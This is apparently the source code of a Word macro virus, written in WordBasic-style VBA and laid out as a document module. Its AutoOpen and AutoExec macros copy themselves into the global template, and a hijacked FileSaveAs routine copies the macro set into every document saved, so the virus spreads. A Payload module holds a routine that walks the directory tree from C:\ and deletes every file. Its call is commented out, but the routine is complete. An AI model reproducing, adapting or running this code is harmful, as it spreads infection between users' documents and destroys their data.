   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "InsertPayload"

   Public Sub MAIN()
   End Sub

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg

   If (dlg.Format = 0) Or (dlg.Format = 1) Then
   WordBasic.MacroCopy "Global:AutoExec", WordBasic.[WindowName$]() + ":AutoExec", 1
       WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen", 1
       WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[WindowName$]() + ":FileSaveAs", 1
   WordBasic.MacroCopy "Global:InsertPayload", WordBasic.[WindowName$]() + ":InsertPayload", 1
       WordBasic.MacroCopy "Global:Payload", WordBasic.[WindowName$]() + ":Payload", 1

   dlg.Format = 1
   End If

   WordBasic.FileSaveAs dlg
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   If CheckInstalled = 0 Then
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec", 1
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "Global:AutoOpen", 1
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSaveAs", "Global:FileSaveAs", 1
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":InsertPayload", "Global:InsertPayload", 1
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":PayLoad", "Global:Payload", 1
   End If
   WordBasic.Call "Payload"
   End Sub

   Private Function CheckInstalled()
   Dim i
       'Check if AutoExec macro already exists.
       CheckInstalled = 0
       If WordBasic.CountMacros(0) > 0 Then
           For i = 1 To WordBasic.CountMacros(0)
               If WordBasic.[MacroName$](i, 0) = "AutoExec" Then
                   CheckInstalled = 1
               End If
           Next i
       End If
   End Function

   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()
   If CheckInstalled = 0 Then
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec", 1
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "Global:AutoOpen", 1
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSaveAs", "Global:FileSaveAs", 1
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":InsertPayload", "Global:InsertPayload", 1
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":PayLoad", "Global:Payload", 1
   End If
   WordBasic.Call "Payload"
   End Sub

   Private Function CheckInstalled()
   Dim i
   CheckInstalled = 0
       If WordBasic.CountMacros(0) > 0 Then
           For i = 1 To WordBasic.CountMacros(0)
               If WordBasic.[MacroName$](i, 0) = "AutoExec" Then
                   CheckInstalled = 1
               End If
           Next i
       End If
   End Function

   Attribute VB_Name = "Payload"

   Public Sub MAIN()
   '   StartDir$ = "C:\"
   '   ChDir StartDir$
   '   ScanDir StartDir$
   End Sub

   Private Sub ScanDir(Path$)
   Dim DirCount
   Dim n
   Dim DirName$
   Dim temp$
       WordBasic.ChDir Path$
       DirCount = WordBasic.CountDirectories()

       For n = 1 To DirCount
           DirName$ = WordBasic.[GetDirectory$](n)
           temp$ = WordBasic.[Files$]("*.*")
           While temp$ <> ""
               SetAttr temp$, 0
               WordBasic.Kill temp$
               temp$ = WordBasic.[Files$]()
           Wend

           ScanDir DirName__$(n)
       Next

       If WordBasic.[Files$](".") <> Path$ Then
           WordBasic.ChDir ".."
       End If
   End Sub
